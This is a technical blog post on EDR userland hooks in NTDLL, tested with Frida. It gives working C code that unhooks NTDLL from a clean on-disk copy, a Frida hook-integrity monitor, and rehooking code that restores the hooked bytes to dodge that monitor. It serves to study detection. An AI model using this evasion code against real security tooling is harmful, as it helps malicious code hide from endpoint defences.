---
layout: default
title: "Checking NTDLL hook integrity with Frida"
permalink: /hook-integrity-checks
---


## Introduction

One of the most ubiquitous evasion techniques used by red teamers right now is DLL unhooking. Many EDR products place userland hooks into NTDLL by overwriting the original function with a JMP instruction to their own function, where they can check for malicious activity and make decisions on alerting/blocking. One of the more common techniques for undoing this is by reading a clean copy of NTDLL from disk and overwriting the hooked version in memory.

One question that I always had when unhooking NTDLL was why it didn't seem to get caught after the fact. From my experience, once you have managed to unhook NTDLL (ie: CreateFile/VirtualProtect/etc. calls weren't blocked), then you're set to evade userland hooks and EDR generally won't complain until you trip some other detection like memory scanning or an ETW event. A while ago I heard someone describe that some EDRs will monitor the integrity of hooks in the process, but I have not seen this behavior in any of the products that I have tested.

I thought nothing of it for a while, but I saw [this](https://makosecblog.com/malware-dev/detecting-dll-unhooking/) blog on r/netsec the other day which walks through detecting DLL unhooking. That blog discusses doing so by focusing on double loaded DLLs or CreateFile calls to NTDLL. This reminded me about hook integrity checks so I hacked on it for a few hours.

In this post, we'll look at:
* Hooking a function with Frida
* Unhooking NTDLL to bypass Frida's hook
* Monitoring the integrity of our hooks with Frida
* Tweaking the unhooking code to rehook NTDLL and potentially avoid hook integrity monitoring

### Hooking with Frida

The first thing I'll do is write a small Frida script to hook NtOpenProcess. This can really be any NTDLL function, but I use NtOpenProcess since some other functions will get called later while we do our unhooking and makes it harder to see what's going on. It is also a commonly hooked function in the wild so it's a good testing target.

If you're not already familiar with Frida, it's a dynamic instrumentation framework. We could write some cool C/C++ using Minhook, Detours, or any of your other favorite hooking libraries, but I like using Frida for this because I'm able to develop and prototype much faster.

```js
  var pNtOpenProcess = Module.findExportByName('ntdll.dll', 'NtOpenProcess');
    Interceptor.attach(pNtOpenProcess, {
        onEnter: function (args) {
            send("[+] Called NtOpenProcess")
        },
        onLeave: function (retval){}
    });
```

If you're not already using [Fermion](https://github.com/FuzzySecurity/Fermion) for all your Frida needs then I would suggest that you do, it's an awesome project.

The above snippet will place a hook in pNtOpenProcess and inform us whenever it is called.

Then we can write some C that calls NtOpenProcess to verify that it is working.

```C
typedef NTSTATUS(NTAPI* _NtOpenProcess) (
    PHANDLE            ProcessHandle,
    ACCESS_MASK        DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    CLIENT_ID* ClientId
    );

void main(){
  Sleep(1000)
  HANDLE hDll = LoadLibraryA("C:\\Windows\\System32\\ntdll.dll");
  _NtOpenProcess NtOpenProcess = (_NtOpenProcess)GetProcAddress(hDll, "NtOpenProcess");
    POBJECT_ATTRIBUTES pAttributes = NULL;
    CLIENT_ID clientId;
    NtOpenProcess(GetCurrentProcess(), PROCESS_ALL_ACCESS, pAttributes, &clientId);
}

```

The above C defines a function prototype for NtOpenProcess, gets a handle to NTDLL, resolves the address of NtOpenProcess and casts it with our prototype, and then calls it. It will sleep briefly at the beginning to ensure that Frida has time to catch up. If we compile and start the executable with Frida, we should see that it does indeed hook NtOpenProcess.

### Unhooking NTDLL

Now that we know our function is hooked, we can bypass it. We can do so using some code from [ired.team](https://www.ired.team/offensive-security/defense-evasion/how-to-unhook-a-dll-using-c++). If you have not already read through all of the material from ired.team, I would really recommend giving it a look.

```c
  typedef NTSTATUS(NTAPI* _NtOpenProcess) (
    PHANDLE            ProcessHandle,
    ACCESS_MASK        DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    CLIENT_ID* ClientId
    );

    void unhookNtdll() {
    HANDLE process = GetCurrentProcess();
    MODULEINFO mi;
    HMODULE ntdllModule = GetModuleHandleA("ntdll.dll");

    GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));
    LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;
    HANDLE ntdllFile = CreateFileA("c:\\windows\\system32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    HANDLE ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    LPVOID ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0);

    PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
    PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);

    for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

        if (!strcmp((char*)hookedSectionHeader->Name, (char*)".text")) {
            DWORD oldProtection = 0;
            boolean isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
            memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
            isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
        }
    }

    CloseHandle(process);
    CloseHandle(ntdllFile);
    CloseHandle(ntdllMapping);
    FreeLibrary(ntdllModule);
}

void main(){

  Sleep(1000)

  HANDLE hDll = LoadLibraryA("C:\\Windows\\System32\\ntdll.dll");
  _NtOpenProcess NtOpenProcess = (_NtOpenProcess)GetProcAddress(hDll, "NtOpenProcess");
    POBJECT_ATTRIBUTES pAttributes = NULL;
    CLIENT_ID clientId;
    NtOpenProcess(GetCurrentProcess(), PROCESS_ALL_ACCESS, pAttributes, &clientId);

    unhookNtdll();

    _NtOpenProcess NtOpenProcess2 = (_NtOpenProcess)GetProcAddress(hDll, "NtOpenProcess");
    POBJECT_ATTRIBUTES pAttributes2 = NULL;
    CLIENT_ID clientId2;
    NtOpenProcess2(GetCurrentProcess(), PROCESS_ALL_ACCESS, pAttributes2, &clientId2);
}
```

First we'll call NtOpenProcess to ensure that it is hooked, then we'll unhook NTDLL, and then we'll call NtOpenProcess again to verify that the function does not show up in Frida. Giving that a run should yield only one hooked function call to the console.


### Checking hook integrity
Great, we can unhook NTDLL and call functions without Frida seeing it! Now let's write some Frida logic to periodically check the integrity of our hooks. Below, I present to you a fantastically hacked up Frida script.

```js
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function doItAll(){
    var pNtOpenProcess = Module.findExportByName('ntdll.dll', 'NtOpenProcess');
    Interceptor.attach(pNtOpenProcess, {
        onEnter: function (args) {
            send("[+] Called NtOpenProcess")
        },
        onLeave: function (retval){}
    });
    await sleep(1)
    var hookedBytes = Instruction.parse(pNtOpenProcess)
    send("[*] Hooked bytes: " + hookedBytes.toString())
    while(true){
        await sleep(1000);
        var instruction = Instruction.parse(pNtOpenProcess)
        if(instruction.toString() != hookedBytes.toString()){
            send("[+] Function appears to be unhooked!")
        }
    }
}

doItAll()
```

Up top, I define a Javascript sleep function. We need this to give Frida a chance to load the hook before we grab the hooked bytes. If we were doing this in C/C++ with inline hooks like an EDR product then we wouldn't need to do this, since it should be equal to a JMP plus the address of the hooked function. Since we need to await it, we will place all of our Frida code into an async function. I'm sure there's a better way to do this but if it ain't broke.

After placing our hook, we call the sleep function. I found that it doesn't really matter how long you sleep for. Then we'll call Instruction.parse to grab the instruction located at the pointer to our function. This is the value that we're going to use to validate that our hook is still in place. In Frida (and many EDRs), it will be a jmp instruction pointing to the hooked function.

Then, for the lifetime of the function, we'll check the hook's integrity every second. This interval could easily be increased/decreased to balance performance overhead and security, a very key tradeoff for EDR products. To verify that our hook is still in place, we will grab the instruction at our function pointer and compare it to the hooked bytes. If the two are different then this means something has removed our hook, and we will alert the console. In a real product this would alert and then nuke the process.

```
[+] Process start success
[*] Hooked bytes: jmp 0x7fffa4a00108
[+] Called NtOpenProcess
[+] Function appears to be unhooked!
```

Running it again will show that we have detected a removed hook.

### Rehooking NTDLL

There are several ways to bypass this, but to stay in the same vein we'll take a look at placing the hook BACK into NTDLL.

Our process will look like:
* Get hooked NTDLL and store it
* Unhook NTDLL
* Call our function(s)
* Replace NTDLL with hooked version

```c
LPVOID getHookedNtdll() {
    HANDLE process = GetCurrentProcess();
    MODULEINFO mi;
    HMODULE ntdllModule = GetModuleHandleA("ntdll.dll");
    GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));
    LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;

    LPVOID hookedNtdll = NULL;

    PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
    PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);

    for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

        if (!strcmp((char*)hookedSectionHeader->Name, (char*)".text")) {
            DWORD oldProtection = 0;
            hookedNtdll = malloc(hookedSectionHeader->Misc.VirtualSize);
            memcpy(hookedNtdll, (LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);   
        }
    }

    CloseHandle(process);
    FreeLibrary(ntdllModule);

    return hookedNtdll;
}

LPVOID rehookNtdll(LPVOID hookedNtdll) {
    HANDLE process = GetCurrentProcess();
    MODULEINFO mi;
    HMODULE ntdllModule = GetModuleHandleA("ntdll.dll");

    GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));
    LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;
    PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
    PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);

    for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

        if (!strcmp((char*)hookedSectionHeader->Name, (char*)".text")) {
            DWORD oldProtection = 0;
            boolean isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
            memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedNtdll, hookedSectionHeader->Misc.VirtualSize);
            isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
        }
    }

    CloseHandle(process);
    FreeLibrary(ntdllModule);
}
```

First we declare a function to parse NTDLL and grab the .text section that we store for later. Then we declare a second function to place the hooked NTDLL back in. This is pretty easy to implement with some slight modification of the code from ired.team that we used before.

Then in our main function:

```c
_NtOpenProcess NtOpenProcess = (_NtOpenProcess)GetProcAddress(hDll, "NtOpenProcess");
    POBJECT_ATTRIBUTES pAttributes = NULL;
    CLIENT_ID clientId;
    NtOpenProcess(GetCurrentProcess(), PROCESS_ALL_ACCESS, pAttributes, &clientId);

    LPVOID hookedNtdll = getHookedNtdll();
    unhookNtdll();

    _NtOpenProcess NtOpenProcess2 = (_NtOpenProcess)GetProcAddress(hDll, "NtOpenProcess");
    POBJECT_ATTRIBUTES pAttributes2 = NULL;
    CLIENT_ID clientId2;
    NtOpenProcess2(GetCurrentProcess(), PROCESS_ALL_ACCESS, pAttributes2, &clientId2);

    rehookNtdll(hookedNtdll);

    _NtOpenProcess NtOpenProcess3 = (_NtOpenProcess)GetProcAddress(hDll, "NtOpenProcess");
    POBJECT_ATTRIBUTES pAttributes3 = NULL;
    CLIENT_ID clientId3;
    NtOpenProcess3(GetCurrentProcess(), PROCESS_ALL_ACCESS, pAttributes3, &clientId3);
```

We'll call NtOpenProcess once hooked, then we'll grab our hooked NTDLL contents and store them, then we'll unhook and call NtOpenProcess again, and then we'll rehook NTDLL and call NtOpenProcess a final time. The reason for calling NtOpenProcess 3 times is that we should only see 2 callbacks.

```
[+] Process start success
[*] Hooked bytes: jmp 0x7fffa4a00108
[+] Called NtOpenProcess
[+] Called NtOpenProcess
```

And we do only see two NtOpenProcess calls. Since we quickly replaced the fresh NTDLL with the unhooked version, we avoided the integrity check.

## Conclusion

As mentioned before, this is certainly not a great way of ensuring that hooks are not tampered with. Aside from the fact that there are other methods to bypass hooking, like direct syscalls, real EDR products have to balance performance overheads, false positive rates, alerting, etc. So it is a much more complex problem than just throwing some string comparisons in an infinite loop. This is also a very loud method, since we have to unhook whenever we want to call malicious code again. That said, I think this is a cool little experiment to get some insight into potential pitfalls with our tooling.

You can find my POC scripts [here](https://github.com/passthehashbrowns/hook-integrity-checks).

### References
[Detecting DLL Unhooking - Makosec](https://makosecblog.com/malware-dev/detecting-dll-unhooking/)

[EDR How Hackers Have Evolved - Optiv](https://www.optiv.com/insights/source-zero/blog/endpoint-detection-and-response-how-hackers-have-evolved)

[Full DLL Unhooking with C++ - ired.team](https://www.ired.team/offensive-security/defense-evasion/how-to-unhook-a-dll-using-c++)

